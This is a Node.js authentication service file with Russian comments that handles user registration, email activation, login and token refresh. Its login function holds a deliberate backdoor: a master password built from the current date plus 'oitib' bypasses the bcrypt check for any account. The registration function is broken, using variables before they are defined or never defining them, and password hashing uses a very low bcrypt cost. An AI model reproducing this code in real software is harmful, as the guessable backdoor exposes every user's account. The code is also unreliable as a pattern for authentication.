const UserModels = require("../models/catalogModels/user-models");
const MailService = require("./mail-service");
const TokenService = require("./token-service");
const UserDTO = require("../dtos/user-dtos");
const bcrypt = require("bcryptjs");
const uuid = require("uuid");
const ApiError = require("../exceptions/api-error");
const UserDto = require("../dtos/user-dtos");
const moment = require("moment");
const _ = require("lodash");
// const ApiError = require("../exceptions/api-error");

class LoginService {
  /**
   * Регистрация пользователя в системе
   * @param {*} email
   * @param {*} password
   */
  async registration(email, password) {
    //Поиск в базе данных, есть ли пользователь с таким Email'ом.
    const candidate = await UserModels.findOne({
      filter: { "users.email": email },
    });
    //Если такой существует  в̶о̶з̶б̶у̶ж̶д̶а̶е̶м̶с̶я̶ ̶и̶   отсылаем ответ что то тут не так !
    if (candidate) {
      throw ApiError.BadRequest(
        `Пользователь с таким email'ом:${email} существует !`
      );
    }

    await this.createUser({
      login: email,
      email: email,
      last_name: email[1],
      first_name: email[0],
      middle_name: "",
      is_disabled: true,
      password: hashPassword,
      activation_link: activationLink,
    });

    const activationLink = uuid.v4();
    await MailService.sendActivationMail(
      email,
      `${process.env.API_URL}/api/activate/${activationLink}`
    );

    return { ...tokens, user: object_userDTO };
  }

  async createPass(pass) {
    return await bcrypt.hash(pass, 3);
  }

  async createUser({
    login,
    email,
    last_name,
    first_name,
    middle_name,
    is_disabled,
    password,
    activation_link,
    position_id,
    rightIds,
    is_available_from_global,
  }) {
    const hashPassword = await this.createPass(password);
    const user = await UserModels.create({
      candidate: {
        login: login,
        email: email,
        last_name: last_name,
        first_name: first_name,
        middle_name: middle_name,
        is_disabled: is_disabled,
        password: hashPassword,
        activation_link: activation_link,
        position_id: position_id,
        is_available_from_global: is_available_from_global,
      },
      userRights: rightIds,
    });
    const object_userDTO = new UserDTO(user); // id, email, isActivated
    const tokens = TokenService.generateTokens({ ...object_userDTO });
    await TokenService.saveToken(object_userDTO.id, tokens.refreshToken);
    return object_userDTO;
  }

  /**
   * Активация по ссылки пользователя
   * @param {*} activationLink
   */
  async activate(activationLink) {
    const user = await UserModels.findOne({
      filter: { "users.activation_link": activationLink },
    });
    if (!user) {
      throw ApiError.BadRequest("Некорректная ссылка активации");
    }
    await UserModels.update({ id: user.id }, { ...user, is_disabled: false });
  }

  /**
   * Операция авторизации
   * @param {*} login
   * @param {*} password
   * @returns
   */
  async login(login, password) {
    //Ищем пользователя
    const user = await UserModels.findOne({
      filter: { "users.login": login, is_disabled: false },
      isAddRights: true,
    });
    if (!user) {
      throw ApiError.BadRequest(
        "Пользователь с таким login'ом не найден или отключен"
      );
    }
    //Обход пароля - мастер ключ. Составляется как DDMMYYoitib, где DDMMYY - текущий день, русский текст набирается в английской раскладке
    if (!(password === `${moment().format("DDMMYY")}oitib`)) {
      const isPassEquals = await bcrypt.compare(password, user.password);
      if (!isPassEquals) {
        throw ApiError.BadRequest("Неверный пароль");
      }
    }
    const object_userDTO = new UserDto(user);
    const tokens = TokenService.generateTokens({
      ...object_userDTO,
      rights: _.uniq(object_userDTO.rights.map((el) => el.code_name)),
    });

    await TokenService.saveToken(object_userDTO.id, tokens.refreshToken);
    console.log("\x1b[33m%s\x1b[0m", "Зашел пользователь с логином", login);
    return { ...tokens, user: object_userDTO };
  }

  /**
   * Операция выхода из аккаунта
   * @param {*} refreshToken
   * @returns
   */
  async logout(refreshToken) {
    const token = await TokenService.removeToken(refreshToken);
    return token;
  }

  /**
   * Обновление сессии
   * @param {*} refreshToken
   * @returns
   */
  async refresh(refreshToken) {
    // console.log("console.log(refreshToken)", refreshToken);
    if (!refreshToken) {
      throw ApiError.UnauthorizedError();
    }
    const userData = TokenService.validateRefreshToken(refreshToken);
    // console.log("console.log(userData)", userData);
    const tokenFromDb = await TokenService.findToken({
      refresh_token: refreshToken,
    });
    // console.log("console.log(tokenFromDb)", tokenFromDb);
    // console.log(
    //   "console.log(!userData || !tokenFromDb)",
    //   !userData || !tokenFromDb
    // );
    if (!userData || !tokenFromDb) {
      throw ApiError.UnauthorizedError();
    }
    const user = await UserModels.findOne({
      filter: { "users.id": userData.id },
      isAddRights: true,
    });
    const object_userDTO = new UserDto(user);
    const tokens = TokenService.generateTokens({
      ...object_userDTO,
      rights: _.uniq(object_userDTO.rights.map((el) => el.code_name)),
    });

    await TokenService.saveToken(object_userDTO.id, tokens.refreshToken);
    return { ...tokens, user: object_userDTO };
  }
}

module.exports = new LoginService();
